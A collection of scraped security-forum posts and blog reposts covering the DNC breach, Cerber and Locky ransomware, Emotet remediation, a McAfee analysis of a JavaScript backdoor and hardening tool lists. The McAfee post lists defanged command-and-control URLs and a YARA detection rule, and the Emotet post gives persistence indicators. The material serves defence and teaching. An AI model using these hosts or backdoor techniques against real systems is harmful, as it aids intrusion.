1666269,Russia's 'Best' Hackers Access DNC's Trump Research- Russia gov connection?,"Russian hackers reportedly penetrated computers at the Democratic National Committee, accessing confidential information, including opposition research on presumptive Republican presidential nominee Donald Trump.An individual familiar with the breaches told the Washington Post that the hackers accessed a year's worth of detailed chats, emails and opposition research on Trump, which could contain details about his personal and professional history. That individual told the newspaper that DNC officials first learned about the breach nearly two months ago, when the political party's technology staff discovered malware on its computers.The DNC turned to the incident response and threat intelligence firm CrowdStrike to investigate the breaches that began as early as last summer.'Some of the Best Adversaries'Dmitri Alperovitch, CrowdStrike's chief technology officer, in a blog identifies two Russian groups - ""Cozy Bear"" and ""Fancy Bear"" - as the hackers, characterizing them as ""some of the best adversaries"" among nation-state, criminal, terror and hacktivist groups. ""Their tradecraft is superb, operational security second to none and the extensive usage of 'living-off-the-land' techniques enables them to easily bypass many security solutions they encounter,"" Alperovitch says.Russia's dismal economy is leaving many of its top mathematicians unemployed, leading them to work as hackers. ""Russians are the best mathematicians in the world and they don't have an industry that employs them very well,"" says Martin Libicki, a senior management scientist at the think tank Rand Corp. whose research focuses on Russian and Chinese cyber endeavors. ""The Russians always had a penchant for espionage because they've run a police state since the czarist era. So, there are a lot of reasons for a lot of this stuff to come together.""Cozy Bear, also known as Cozy Duke or APT 29, last year successfully infiltrated the unclassified networks of the White House, State Department and U.S. Joint Chiefs of Staff as well as other national governments and private-sector organizations around the globe, according to Alperovitch. Fancy Bear, also called Sofacy or APT 28, has targeted worldwide systems in the aerospace, defense, energy, government and media sectors, he says.Cozy Bear breached the DNC network last summer, while Fancy Bear separately breached the DNC network in April, Alperovitch says.""We have identified no collaboration between the two actors, or even an awareness of one by the other. Instead, we observed the two Russian espionage groups compromise the same systems and engage separately in the theft of identical credentials,"" Alperovitch says. ""While you would virtually never see Western intelligence agencies going after the same target without de-confliction for fear of compromising each other's operations, in Russia this is not an uncommon scenario.""Russian Government Connection?Joseph Carson, head of global strategic alliances at Thycotic, a provider of privileged account management tools, says it's difficult to determine if these hackers are following instructions from the Russian government or doing these activities simply for recognition or financial gain. ""When Russia has a political dispute between other countries - for example Estonia, Georgia and Ukraine - we have seen a significant increase in cyber crime against those countries,"" he says.Before Russia's invasion of Ukraine in 2014, when it seized Crimea, Russian hackers operated more stealthily than they do today, Rand's Libicki says. ""These guys have always been good,"" he says. ""But before 2014, you never saw them because they were like our NSA. They're very careful, they're very methodical; they really didn't want to get caught.""With tensions between the United States and Russia at a post-Cold War high, the hackers - and their apparent Kremlin patrons - seem less concerned about being identified for their online assaults, Libicki says. ""They don't mind getting caught as much as they used to,"" he says. ""It's a form of brandishing on their part, to see what kind of capabilities we have, to see what kind of bad enemy we can be to you if you don't watch out. From their intervention of Crimea forward, they're putting on a nastier face viz a viz the West.""﻿Read the full article here.",0

Need to find which PC's were hit.,"So last week we had a user get hit with the newest variant of Cerber.  She immediately called because her background changed and she was confused why it had.  I took the call and remoted into her PC and as soon as I saw the background, I shutdown her PC and told her not to turn it on.  I checked our 2 main file servers and nothing had been changed on them.  So I got a replacement PC and headed out to swap it.  While I was swapping it, I asked what email she opened recently and she said she hadn't opened any.  Well, after I replaced her PC, I checked our inbound spam filter and she hadn't received any external emails that day or anything unusual that week.  I then looked in her Outlook inbox and deleted items to verify and there were no suspicious emails.  At this point I'm assuming she either opened a bad email in a personal email account or she got hit by a drive by download.After taking care of the PC, I began to look at the terminal server she was using.  I found a readme.hta in her user folder there.  Since they use temporary rds profiles, I just had everyone log off the terminal server and deleted all user profiles.  I checked all the other areas she would have write access to and didn't see anything then.Back in the office, I started digging through our Trend OfficeScan logs and there was nothing.  It had previously stopped 2 other ransomeware attacks as soon as it saw an unrecognized program was trying to encrypt files.  I figure the logs are being recorded due to the way our rds sessions were setup (I have a support case logged to figure this out).Fast forward to today and I'm looking on my PC at our main program which is acting funny.  I start digging through the usual culprits and find that there is a readme.hta file on my PC.  I checked the file properties and discover that the owner was the person who had got hit last week.  I have no idea how it infected my PC.  The exact location of the file is c:\users\public\software\folder\folder\ and there is no other location on my PC that has a readme.hta.  When I saw I was infected, I wondered if the payload could have somehow jumped via the remote session, but then one of our other techs mentioned he had some minor issues with the same software.  I checked his PC and his c:\users\public\software\folder\folder\ had the readme.hta and he hadn't remoted into this PC or mine.  So I checked the rest of the PC's in our area and 3 of the 8 have readme.hta in c:\users\public\software\folder\folder\ all showing the owner as the original user.So from what I'm seeing because domain users have right access to the folder, Cerber can encrypt files on other PC's even though there's no drive mapping between them.  Does anyone have a good tool to scan this specific folder on every PC in the domain?",0

Stay safe, and read on...Data Breach at Quora: Popular question-and-answer site Quora has reported a large data breach, affecting approximately 100 million users. Among the exposed data were hashed site passwords, which may still post a threat, and Avast Security Evangelist Luis Corrons suggests you change your Quora password if you were affected. Also, if that password was used on any other sites, change it there as well. (You could use our secure password generator, too!)1-800-Flowers reports malware credit card skimming: The Canadian division of flower delivery service 1-800-Flowers stated that malware on their website has been skimming data -- including credit card numbers -- for a staggering four years. It seems the data suck grabbed everything a bad actor would need to use the affected credit cards, although the company hasn't clarified how many or who may be affected.Sennheiser headset software may leave you open to vulnerability: Some Sennheiser headsets use a companion software called HeadSetup. Apparently, this software is needed to enable the headsets to work with computers and used for setup. A new report says that this software leaves both PC and Mac users vulnerable -- specifically, that when compromised, the software can impersonate or spoof websites. From there, hackers could then use these websites to harvest credentials and other personal data.

2155462,Preventing and Recovering from Emotet — 2018's Most Active Malware,"Hi all,Passing along an alert: At Barkly we’re currently seeing a surge in Emotet, a malicious trojan US-CERT recently described as “among the most costly and destructive malware” affecting organizations today. Organizations infected with Emotet can experience persistent infections, credential theft, account lockouts, email hijacking, and fraudulent bank account withdrawals. Remediation efforts have been documented costing up to $1 million per incident. Due to the spike in activity, we wanted to provide more information on how Emotet works, along with tips for removal, prevention, and also how Barkly can help. We've put together a page where you can find all that info here: https://www.barkly.com/emotet-trojan-removal-preventionHigh-level bullet points below:What is Emotet?A banking trojan that has evolved into a loader that distributes other banking trojansIt's currently one of the most common types of malware that we and others are seeing this yearHow is it delivered?Typically via spam emails with malicious Word doc attachments or links to malicious Word docs (see a screenshot example here)It's not always your average spam, though. As part of the infection process Emotet (and the trojans it distributes) has been known to hijack victim email accounts and use them to send out additional spam emails to that person's contacts. As a result, those emails appear to be coming from someone the recipient knows. In some cases, the emails can even be replies to existing email chains. What does it do?Note: Emotet workflows and malicious impact varies. It can largely depend on what additional malware it's downloading. Victims may experience any of the following:Aggressively infects machines over and over again thanks to registry modifications and scheduled tasks that ensure it gets executed at startup and at regular intervalsDisables Windows DefenderDownloads additional malware (typically other banking trojans like TrickBot, Zeus Panda, etc.)Tries to spread internally throughout compromised networks via hidden admin shares and SMBAttempts to brute force access to other accounts and machines, which may result in account lockoutsSteals credentials stored in system memory, email accounts, and browsersThe banking trojans it downloads are designed to wait until victims visit their banking websites, then intercept their credentials and drain their accountsRemediation adviceDO NOT use privileged accounts to log in to potentially compromised systems during remediation. Doing so risks accelerating the spread of the infection.Change all passwords associated with compromised machines, users, and accounts, including all local and domain administrator passwords. Email account passwords are especially important to change, otherwise victims can quickly find themselves turned into involuntary spammers.Use a Group Policy Object (GPO) to block workstations from using SMB to access one another. Example here.Indicators of compromise (IoCs) — What to look for and whereExecutablesEmotet typically stores executables in arbitrary paths located off AppData\Local or AppData\Roaming directories. Ex: C:\Users\[username]\AppData\Local\Microsoft\Windows\[random].exeIf Emotet gains admin privileges it creates files in system root directories (ex: C:\Windows\SysWOW64\svcapp.exe) that are registered and run as Windows servicesNote: These executables are randomly named and polymorphic — each one is a modified mutation of previous samples so no two samples are alike. As a result, many traditional AVs are having a hard time detecting them. Registry modificationsEmotet typically creates a registry run key to ensure it gets executed at startup: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\[random name of Emotet executable]If it has admin privileges and has created a service, it creates the following registry subkey: HKLM\SYSTEM\ControlSet001\services\[name of Emotet executable mimicking a service]Tips for investigating the registry:Use Windows Autoruns (shows programs configured to launch at startup, also has VirusTotal integration to verify whether any suspicious programs are malicious)Or search for Windows event ID 4657 in the system Security logScheduled tasksUse Autoruns or Task Scheduler to look for recently created scheduled tasks, specifically ones with a suspicious Publisher listed or without any Publisher listedOr search for Windows event ID 4698 in the system Security logClearing registry modifications and scheduled tasks is important. Otherwise, they'll continue to spawn additional payloads and the infection will just keep coming back.  How Barkly can helpBarkly prevents Emotet infections from happening in the first place. Not only does it block Emotet payloads, it also prevents malicious Word docs from downloading the initial payload to begin with.Installing Barkly on previously compromised machines has also helped admins contain and investigate active infections. While Barkly doesn’t actively clean infected machines, it does help streamline the incident response process by allowing admins to:Isolate compromised machines with 1-click (even from your phone)Ensure no payloads are successfully executed while you focus on remediation effortsInvestigate where payloads are being launched from with incident path visualization Interested in hearing whether any others have been experiencing Emotet infections. Hopefully this information is helpful in remediating (or better yet) preventing attacks. ",11

1028936,Stealthy Cyberespionage Campaign Attacks With Social Engineering,"Cyberespionage continues to be a hot topic in our industry, and the information security nerd in me always finds it exciting when our McAfee Labs team is able to speak about their findings. Here is a blog post from Rahul Mohandas on a recent campaign:﻿﻿Stealthy Cyberespionage Campaign Attacks With Social EngineeringCyberespionage attacks pose a challenge for the security industry as well as for the organizations trying to protect against them. Last year, McAfee Labs predicted that in 2015 these attacks would increase in frequency and become stealthier, and we have seen this occur. Cyberespionage aims at specific organization or sectors that are high-value targets, with most attacks flying under the radar.The McAfee Labs research team has tracked an advanced persistent threat for the past couple of months. This group has evolved a lot in sophistication and evasion techniques to defeat detection by security products. This group has been active since at least 2014 and uses spear-phishing campaigns to target enterprises. We have observed this group targeting defense, aerospace, and legal sector companies.The AttackThe preceding email provides a clear indication that the attackers have researched their target and its employees. Social media sites such as LinkedIn, Twitter, and Facebook are good sources of such valuable information, which can be used for social-engineering attacks.The Excel attachment opens with a “password protected” window, tricking the victim into believing the file requires a password to display the content.The Excel file is laced with a malicious macro that runs in the background. To prevent easy detection, the macro is obfuscated using Base64. The Excel file drops an .hta file, which contains the backdoor functionality.This attack uses some novel techniques:A JavaScript backdoor component, unlike most exploits or malicious Office files, which use an embedded or a direct download of a binary.The JavaScript backdoor is obfuscated and dropped to %Appdata%\Microsoft\Protect\CRED. It persists on the machine using a registry run entry created by the mshta application.The launched window is hidden using the JavaScript command “window.moveTo(-100,-100), window.resizeTo(0,0).”JavaScript backdoor capabilitiesThe attack minimizes its footprint by running only a script, which has lower chance of being flagged as malicious. Some of the backdoor capabilities:Querying system information using WMI.Using a proxy server for connections.Downloading and executing remote files.Using file/directory/network/process/registry and system operations.Control serversThe WMI queries collect system-related data. The following parameters are collected and Base64 encoded before posting to the control servers:Hash of volume serial numberComputer nameIP addressCurrent usernameOperating systemProxy serverThe JavaScript backdoor connects to a gateway that receives additional commands from the attacker. Some of the control servers:hxxp://humans.mooo[.]info/common[.]phphxxp://mines.port0[.]org/common[.]phphxxp://eholidays.mooo[.]com/common[.]phpOne of the attacker’s first actions is to profile the infected host by executing commands that display a list of domains, computers, or resources shared by the specified computer (using the net view command). This is followed by gathering more information about the files on the desktop and other drives. An attacker can use this information for further lateral movement. All the data is posted to the control server as Base64-encoded data.DetectionDefending against these highly targeted social-engineering attacks involves a human element. Although technical controls mitigate the risks, it’s imperative that organizations establish policies to help employees spot suspicious events.McAfee Advanced Threat Defense provides zero-day protection against this attack based on its behavior.The following Yara rule detects the OLE attack vector:rule APT_OLE_JSRat{meta:author = “Rahul Mohandas”Date = “2015-06-16″Description = “Targeted attack using Excel/word documents”strings:$header = {D0 CF 11 E0 A1 B1 1A E1}$key1 = “AAAAAAAAAA”$key2 = “Base64Str” nocase$key3 = “DeleteFile” nocase$key4 = “Scripting.FileSystemObject” nocasecondition:$header at 0 and (all of ($key*) )}﻿I thank my colleague Kumaraguru Velmurugan of the Advanced Threat Defense Group for his invaluable assistance.",0

958496,Vulnerability scan vs. penetration test vs. risk analysis,"You've just finished deploying putting your new website/mobile app/killer cloud-based platform up. So, now what?  Your next step should be a no-brainer: Plug all the holes in your security systems and, while you're at it, keep mouthing, ""Don't get hacked,"" your newest mantra. But how do you find these security holes? There are three main processes, according to CSO, and you've more than likely heard of them: vulnerability scanning, penetration testing, and risk analysis assessment. But what are they and when do you use them?  First step: Vulnerability assessment. CSO reports that while these are ""most often confused with penetration tests and used interchangeably, ... they are worlds apart."" Vulnerability tests are commonly directed with ""off the shelf software ... such as Nessus or OpenVas,"" and scan your IP addresses for publicly known vulnerabilities. Say you haven't yet patched against Heartbleed (for shame) and bam: It shows up on your vulnerability test. But that's not all. You get a full report ""that lists out found vulnerabilities and (depending on the software and options selected) will give an indication of the severity of the vulnerability and basic remediation steps."" And that's your vulnerability assessment. Second step﻿: A good ""penetration test takes the output of a network scan or a vulnerability assessment and takes it to 11 – they probe an open port and see what can be exploited."" The probe here is what sets a penetration test apart from a vulnerability scan. As opposed to finding a vulnerability and documenting it, a penetration test analyzes the severity and depth of found vulnerabilities, documenting how much information (and what kind) is at risk if your networks are penetrated. Some testers will use ""automated tools, such as Metasploit, but veteran testers will write their own exploits from scratch."" ﻿Third step﻿: When you've finished your vulnerability scans and penetration testing, there's one more security measure to consider. A risk analysis report is a long and lengthy document that goes beyond the more rudimentary questions of (1) are you at risk and (2) what is at risk. Instead it ""attempts to ascertain the risk [go figure] – including financial, reputational, business continuity, regulatory and others – to [your] ... company if the vulnerability were to be exploited."" It sounds complicated because it is: Looking over assets, vulnerabilities, threat risk, and potential impact to your company, a risk analysis report is the meeting point between insurance, finance, and security pros. If 2014 was the year of the megabreach, 2015 is the year of the security assessment. Minimizing your risks requires knowing them in all their gritty detail. ﻿Have you had any of these tests done professionally before? How do you handle your security needs? ",11

1633977,Internet of Things- Connected Targets,"Can you believe we are approaching 50 billion connected devices? With the growth of the Internet of Things (IoT), we have devices with varying degrees of security that tempting targets to attackers. What we have heard about in theory for years, is now becoming a reality, as cyberattacks increase against physical assets  like cars, smart home devices, or electric power stations.Cyberattackers are driven by  incentives, and the greater the incentive, the more likely someone is to attack a particular target.  Attackers are moving beyond the credit card data of years past, where a few hundred dollars was the incentive, to hospitals and universities, where records become hostages for ransomware. There are steps we can take to bolster security in the new IoT world, as outlined in this article:1. Design with security in mind. All devices and solutions built around IoT have to be designed thinking about security from the outset. One example is using the concept of least privilege to minimize attackers’ opportunity: Devices, systems, and applications should have access to the bare minimum capabilities required to perform their function. Developers must understand the full lifecycle from shipping to decommissioning, follow coding best practices, and leverage the many hardware and software security capabilities available (hardware separation, ASLR etc.).2.  Look at security from different levels of zoom. Valuable data is vulnerable and security breaches possible at all levels, from an individual sensor to a connected device to the overall system. System-level infiltration may deliver the highest incentive to attackers, but breaches are possible at the sensor or device level. IoT security means understanding the full context of the system,as well as the individual components.3. Support the academic industry in producing more cybersecurity professionals. Ultimately, the security and IoT industries need to evolve and collaborate, from education to deployment. Cybersecurity should become a core discipline of engineering, alongside calculus, physics, and chemistry. Development lifecycles must include a security component, similar to the quality component. All of this must be researched, taught, and reinforced, from undergraduate programs to professional continuing education. 4.  Think like the adversary to anticipate exploits and address them in advance. Finally, we need to continue to think like our adversaries, refining threat-agent profiles, identifying digital assets, and assessing weaknesses. Deployment processes must evaluate how to minimize the incentive and opportunity for attackers, while maximizing their risk.﻿",12
428297,Passwords - Password State vs. Secret Server vs. LastPass vs. ?,"We currently use KeePass.Works great except that it isn't granular i.e. you can't limit access to a credential only to an entire database.I looked at LastPass Enterprise as I use it personally, and what I've found is that it seems a little too geared around websites - it just doesn't seem as quick and intuitive as KeePass if you want to look for a generic credential like that of a switch or router.Secret Server and Password State seem to be the other two leading products - does anyone have any experience of either?Also whilst KeePass is simple it does have the benefit of being easy to backup and restore - does anyone have any thoughts on the overhead/complexity of requiring an entire Windows + IIS + SQL stack just to store credentials - seems like added hassle and pressure during a DR scenario?I notice Secret Server offer a hosted version which is one way around that though then you get into the ""Would you store that sort of info on a hosted service?"" debate...",0

1448815,It's Here. New Ransomware Hidden In Infected Word Files,"   ﻿It was only a matter of time, but some miscreant finally did it.  There is a new ransomware strain somewhat amateurishly called ""Locky"", but this is professional grade malware. The major headache is that this flavor starts out with a Microsoft Word attachment that has malicious macros in it, making it hard to filter out. Very few antivirus engines catch it, you can see the Virustotal results here.The email message will contain a subject similar to ATTN: Invoice J-98223146 and a message such as ""Please see the attached invoice (Microsoft Word Document) and remit payment according to the terms listed at the bottom of the invoice"". This new strain was first reported in the UK by Kevin Baumont, and Larry at Bleepingcomputer did a more in-depth analysis.   When the Word document is opened, it looks like the content of the document is scrambled and the document will display a message stating that you should enable the macros if the text is unreadable.

2069142,IDTaaS?,"Reading about Kevin Mitnick's keynote at SW17, I had an idea.  Of course since the idea was mine, the implementation would be fraught with real-life peril to life and limb and asset portfolios, but maybe still useful.White hats could offer a service whereby a person subscribes for some nominal fee*, and the hackers** demonstrate measurable effects against that person's online presence, PII, and personal assets.  They could measure and report on things like, how long it took to gain access to your bank account(s), how long it took to commandeer your Facebook/Twitter/*mail/etc accounts, how many data points are free for the taking about you/your workplace/family/friends/lifestyle, how many sites share your password, how many internet things know and use your identifying credentials in impersonation, how many other identities are readily connected to you online, etc.With such a security report in hand, they could then offer further services to help remediate these risks by training users to be more savvy, helping folks set up a password vault, seeding noise among signal, and so forth.Since it's not purely a training exercise, I don't think anything like this is quite in the market today.  Feel free to educate me on that point if I'm simply ignorant.Of course on the surface it seems like a Bad Idea™, but with proper controls in place, might there be a market for private citizens to hire, presumably in perpetuity, their own personal tiger teams?*NOT for free!  Transactions and contracts can prove intent and will...

318380,Insider notes: 3/21 Congress hearing on protecting SBs against cyberattacks,"By Eric Chabrow, March 22, 2013.Follow Eric @GovInfoSecurity Share on print            When one's involved in information security 24x7 (okay, I take off from work time to time, but don't tell my boss), it's easy to forget that the vast majority of the population remains oblivious to cybersecurity, especially how it affects them personally.That lack of awareness was driven home this past week at a hearing held by the House Small Business Subcommittee on Health and Technology on protecting small businesses against emerging and complex cyber-attacks. The main take away from that hearing was that the biggest information security problem most small business operators face is that they're unaware they have an IT security problem.When you incorporate a new business, there are a lot of steps people know they need to go through, and not one of them is cybersecurity.""Most small businesses that have been hacked don't know they've been hacked,"" testified Justin Freeman, corporate counsel of Rackspace, an IT hosting company.Nearly eight in 10 small business operators believe they're safe from cyber-attacks, subcommittee Chairman Chris Collins, R-N.Y., said in his opening remarks, adding: ""Many of these firms have a false sense of security and believe they are immune from a possible cyber-attack. This is clearly a gap in education and resources.""Collins, later in the hearing held March 21, made this observation about small business owners: ""They're coming to work everyday, to make a sale, to have some cash in the bank, to pay their bills; [cybersecurity is] not on their radar. We want to put it on the radar.""A People ProblemHow widespread is this lack of awareness about IT security among small businesses? Collins asked the witnesses, all from industry, what advice they would give to small businesses to secure their digital assets. Their responses were basic, time-tested solutions very familiar for those who have paid attention to IT security for years: varied, long, multi-character passwords; encryption; compliance to IT security policies (the businesses must establish them first) and employee awareness.""This is not just a technology problem, this is a people problem, so a lot of emphasis on the training and education,"" Phyllis Schneck, McAfee vice president and chief technology officer for the public sector, told the panel. ""When you incorporate a new business, there are a lot of steps people know they need to go through, and not one of them is cybersecurity. That's an afterthought completely, so you already start off behind. Many small businesses are harboring some of the neatest inventions for the next decades; they don't necessarily think of where they store stuff or categorize those assets and how you protect it.""Another witness, Dan Shapero, an IT entrepreneur who represented the Computing Technology Industry Association at the hearing, said the financial burden caused by 47 different state breach notification laws could be eased by passage of a national breach notification law.""The current patchwork of state data breach laws imposes duplicative costs and undue burden on SMBs (small and midsize businesses),"" Shapero testified. ""With our increasingly mobile economy, these laws are getting even more complicated to understand since it is not always clear what state a data breach may have actually occurred in, which can be different from where a consumer may reside. The creation of a national framework for data breach notification can go a long way toward reducing costs and eliminating barriers to entry for SMB firms.""Involving Small Business in Nation's Security ParadigmSchneck pointed out that many, if not most, small business have neither the money nor cyber-expertise to exploit institutions that help businesses secure their IT, such as sector-specific information sharing and analysis centers, so-called ISACs. She encouraged the subcommittee to conduct a study or hold hearings to develop policy proposals to get small businesses to participate in ISACs. ""We need to find a way to include small business in our nation's security paradigm,"" she said.Finding that way is where Congress can help lead.",11

1381606,Antivirus for Linux with real-time protection,I'm making a pair of file servers (one for Dropbox syncing and one for downloading) to replace a Server 2008 R2 based VM that's currently doing both. I use avast! business on that and it works fine but there currently isn't a Linux version available (Windows and OSX only). The servers would be mostly serving Windows client but also Linux as well. I plan to use CentOS 7 but one may be Ubuntu due to issues getting one of the programs compiled and set up.So what's a good candidate for Linux? I know ClamAV is popular but does not have real-time protection. I've looked at Sophos but the last proper review of it for Linux I can find is from 2012. Important is something that is relatively up to date and available in the repositories. I don't mind doing manual installs but it makes administration and automation a bit of a pain.,5

2168757,Cyber News Rundown: Windows 10 Update Deletes Files,"Latest Windows 10 Update Removes User FilesMicrosoft recently pulled its latest update, version 1809, after several users complained about personal files being deleted.

Since hearing of the issue, Microsoft has paused the automatic update until they can find a resolution.Magecart Campaign Continues Its SpreadFollowing the attacks on British Airways and Ticketmaster, Magecart skimmer techniques have been discovered on Shopper Approved, a collective of several online stores. Fortunately, the company was able to identify the altered JavaScript code and contact affected vendors. The malicious code itself was targeted at the checkout pages for the affected stores with specific URL keywords, leaving the remainder of the thousands of online retailers unaware anything had occurred.Vulnerabilities Found in Millions of Chinese ElectronicsA new wave of vulnerabilities has been spotted in nearly 9 million devices made by Chinese-based Xiongmai, leaving them susceptible to attack. Serious issues include default admin passwords without a prompt to immediately change it, no encryption when connecting to their cloud servers, and a lack of authorization checks when searching for updates. Many of these devices were known to be compromised during the Mirai botnet attacks, though the access points used for that have since been patched.FCC To Block Illegal Spam CallsMost people have received at least one unwelcome call on their mobile phone from a robotic auto-dialer. Now the attorneys general from 35 states are coming together in hopes the FCC can do something about those annoying calls. These types of spam calls seem to have increased in volume in recent years, even after the 2017 Call Blocking Order aimed at stopping them,  forcing customers to block calls themselves.

226951,URGENT: Mixed SSL Information,"Background:My company's vendor recently told us that we will need a FQDN and a static IP to install SSL certifications onto the Apache web server.

The company is very behind in compliance and we are trying to catch up.Example/Question:I setup Spiceworks on the same network, router, and static IP but a concurrent server and enabled SSL for external network use and it works fine through my dyndns.org account.

I have it enabled by Spiceworks (built-in) and the server it is on is just in a 'WORKGROUP'.I need to get SSL enabled and my company compliant as soon as possible but yet FQDN (Active Directory) won't happen for months due to a physical move and re-wiring of a few office buildings. Is my vendor trying to buy time or is this a required step when installing SSL certs to Apache? Thanks for all the information and help you can give me in advance.

The Windows firewall, and GPOs work just great for this.  iptables (I prefer over firewalld, because I said so) can also do this, with the ability to push out changes via puppet, or scripts.BTW, Windows Firewall with Advanced Security has a STIG!  There is also a STIG for configuring a default deny on iptables.  Your welcome!11-3 - Perform automated port scans on a regular basis against all key servers and compared to a known effective baseline.  If a change that is not listed on the organization's approved baseline is discovered, an alert should be generated and reviewed.See tools under section 11-1 and 3-8 (HIDS)﻿﻿11-4 - Keep all services up to date and uninstall and remove any unnecessary components from the system.﻿This should be done when you build your master image.  Also, your organizations STIG should define the baseline for your workstation and server operating system.  I will refer you to section 3-1 for STIGs and secure baselines.  Also, reefer to section 3-2 for patching and software update tools11-5 - Verify any server that is visible from the Internet or an untrusted network, and if it is not required for business purposes, move it to an internal VLAN and give it a private address.﻿Basically, don't put internal only servers out on the DMZ, or in the security zone where your public servers reside.11-6 - Operate critical services on separate physical or logical host machines, such as DNS, file, mail, web, and database servers.Self explanatory, but just in case...dont combine your torrent server with your ADDC.  :)11-7 - Place application firewalls in front of any critical servers to verify and validate the traffic going to the server.﻿Free Tools* ModSecurity - Probably the most well known opensource Layer 7 firewall. For good reason too, very feature rich and can be used within pfSense firewalls.* AQTronix - Open source WAF, used for Apache and IIS web apps.* NAXSI -  Open source WAF for you crazy NGINX usersControlled Use of Administrative PrivilegesAUTHOR NOTE!!!!! With the recent vulnerability disclosures of Kerberos Golden & Silver tickets, this section is particular important!﻿12-1 - Minimize administrative privileges and only use administrative accounts when they are required.  Implement focused auditing on the use of administrative privileged functions and monitor for anomalous behavior. ﻿This is pretty standard in Linux. You crazy Windows users need to stop setting everyone as local admin.  At the VERY least, create a second account for them to use when needing to perform admin tasks, and disable login from those account through group policy. See section 2-1 for implementing privileged escalation of non-admin user account.12 -2 - Use automated tools to inventory all administrative accounts and validate that each person with administrative privileges on desktops, laptops, and servers is authorized by a senior executive.Be careful with this. Often, Sr. execs have no clue which side of the DVD is down.  At least authorized by the IT director. Use HIDS to monitor these accounts (section 3-8).12-3 - Configure all administrative passwords to be complex and contain letters, numbers, and special characters intermixed, and with no dictionary words present in the password. Pass phrases containing multiple dictionary words, along with special characters, are acceptable if they are of a reasonable length.﻿ToolsWhile your at it, mitigate pass-the-hash attacks with the following tool:* ﻿LAPS - Randomize each local admin account's password and store is securely in Active Directory.  Can be deployed through GPMC.12-4 - efore deploying any new devices in a networked environment, change all default passwords for applications, operating systems, routers, firewalls, wireless access points, and other systems to have values consistent with administration-level accounts.No tools, just common sense.12-5 - Ensure that all service accounts have long and difficult-to-guess passwords that are changed on a periodic basis, as is done for traditional user and administrative passwords.This can help mitigate attacks whereby the attacker forges a Silver Ticket.  Think passwords 25+﻿ characters long.  Each one different, and randomly generated.12-6 - Passwords should be hashed or encrypted in storage.  Passwords that are hashed should be salted and follow guidance provided in NIST SP 800-132 or similar guidance.  Files containing these encrypted or hashed passwords required for systems to authenticate users should be readable only with super-user privileges.﻿﻿﻿You can monitor these files, and access attempts with a good HIDS (Section 3-8).12-7 - Utilize access control lists to ensure that administrative accounts are used only for system administration activities, and not for reading e-mail, composing documents, or surfing the Internet. Web browsers and e-mail clients especially must be configured to never run as administrator.Common sense here, no tools needed.12-8 - Through policy and user awareness, require that administrators establish unique, different passwords for their administrative and non-administrative accounts.  Each person requiring administrative access should be given his/her own separate account. Users should only use the Windows ""administrator"" or UNIX ""root"" accounts in emergency situations.  Domain administration accounts should be used when required for system administration instead of local administrative accounts. ﻿Again, common sense.  No tools needed.  12-9 - Configure operating systems so that passwords cannot be re-used within a time frame of six months.Tools* GPO - In Group Policy, this setting is called Password History.* Linux - Also called Password History12-10 - Configure systems to issue a log entry and alert when an account is added to or removed from a domain administrators' group, or when a new ﻿local administrator account is added on a system. ﻿﻿Free Tools* Netwrix - AD Change Reporter Free, One of the most simple setups I have ever performed.  But, you MUST read the user guide that comes with the download file.  There are some pre-requisites that must be met.* Scripted - Alternative to using 3rd party software.  Easy to follow guide.* GPO - Only enables logging, you still need to alertCommercial Tools* ADAuditPlus - ManageEngines real time monitor and alerting tool* Netwrix also offers commercial versions of their free tool above.12-11 - Configure systems to issue a log entry and alert when unsuccessful login to an administrative account is attempted.One consideration, you have more than just domain admin and local admin accounts you should worry about.  You have Schema Admins, Enterprise Admins, SQL admins, Spiceworks admins, IIS Admins, Switch Admins... ANY admin account on any device/application should be monitored.Free ToolsIf you enable logging on your domain controllers, the logging is taken care of.  You now need something that can report on these logs.  SEIM comes to mind (Section 3-8).* Splunk - There is a discussion on their community regarding this feature.Commercial ToolsThe above listed tools each have commercial versions too12-12 - Use multifactor authentication for all administrative access, including domain administrative access.  Multi-factor authentication can include a variety of techniques, to include the use of smart cards with certificates, One Time Password (OTP) tokens, and biometrics.Free Tools* FreeRADIUS - This is the poor-man's RSA token.  But, it works.* Authy - 2 factor authentication for Wordpress sites.Commercial Tools* Duo Security Easily the most feature rich and well documented implementations of 2FA.* Wikid - One of the cheaper multi-factor vendors out there.  Pretty solid product, too.* Telesign - authenticates end users via SMS, voice and mobile app.﻿* MS Azure - Previously called phonefactor12-13 - When using certificates to enable multi-factor certificate-based authentication, ensure that the private keys are protected using strong passwords or are stored in trusted, secure hardware tokens.﻿Just a best practice...12-14 - Block access to a machine (either remotely or locally) for administrator-level accounts. Instead, administrators should be required to access a system using a fully logged and non-administrative account. Then, once logged on to the machine without administrative privileges, the administrator should transition to administrative privileges using tools such as Sudo on Linux/UNIX, RunAs on Windows, and other similar facilities for other types of systems﻿.AUTHOR NOTE!!! You should also deny logons to your service accounts, but grant them the ""log on as a service"" right in Group Policy"".Tools* GPO - Deny logons to specific groups/usersBoundary Defense﻿13-1 - Deny communications with (or limit data flow to) known malicious IP addresses (black lists), or limit access only to trusted sites(whitelists).﻿This is one of those, ""Easy to say, hard to do policies.""  But if you consider starting with things like public servers, internal servers, switches, VOIP phones, and other network device VLANs, really, those devices don't need much access to the internet, and whitelisting becomes a bit easier.  For workstations...good luck, unless you're a military contractor.13-2 - On DMZ networks, configure monitoring systems (which may be built in to the IDS sensors or deployed as a separate technology) to record at least packet header information, and preferably full packet header and payloads of the traffic destined for or passing through the network border.  This traffic should be sent to a properly configured Security Information Event Management (SIEM) or log analytics system so that events can be correlated from all devices on the network.See section 3-8 for tools﻿13-3 - To lower the chance of spoofed e-mail messages, implement the Sender policy Framework (SPF) by deploying SPF records in DNS and enabling receiver-side verification in mail servers.﻿Free Tools* SPFwizard - create your SPF record for free online.* MXToolBox - Test your SPF and other domain records* Learn more about PSF13-4 - Deploy network-based IDS sensors on Internet and extranet DMZ systems and networks that look for unusual attack mechanisms and detect compromise of these systems. These network-based IDS sensors may detect attacks through the use of signatures, network behavior analysis, or other mechanisms to analyze traffic.﻿ Look at section 5-8.  Both of these tools provide signature and/or anomaly based network intrusion detection.13-5 - Network-based IPS devices should be deployed to complement IDS by blocking known bad signature or behavior of attacks.﻿Free Tools* Suricata - I rarely see this tool used alone, since it is so popular among vendors it is often included with larger security appliances for its IPS features.* Snort - Probably the most used open source IPS.  Don't forget to get an OinkCode!Commercial ToolsMost Firewall devices offer network IPS.13-6 - Design and implement network perimeters so that all outgoing web, file transfer protocol (FTP), and secure shell traffic to the Internet must pass through at least one proxy on a DMZ network. The proxy should support logging individual TCP sessions; blocking specific URLs, domain 